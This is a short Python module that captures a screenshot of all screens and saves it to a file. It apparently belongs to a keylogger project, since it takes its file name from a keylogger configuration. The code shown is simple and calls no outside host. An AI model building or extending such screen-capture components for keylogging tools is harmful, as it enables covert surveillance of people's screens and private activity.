from PIL import Image, ImageGrab

from config.keylogger_config import SCREENSHOT_FILE_NAME


def get_screenshot(output_file_name=SCREENSHOT_FILE_NAME):
    screenshot = ImageGrab.grab(all_screens=True)
    screenshot.save(output_file_name)


if __name__ == '__main__':
    get_screenshot()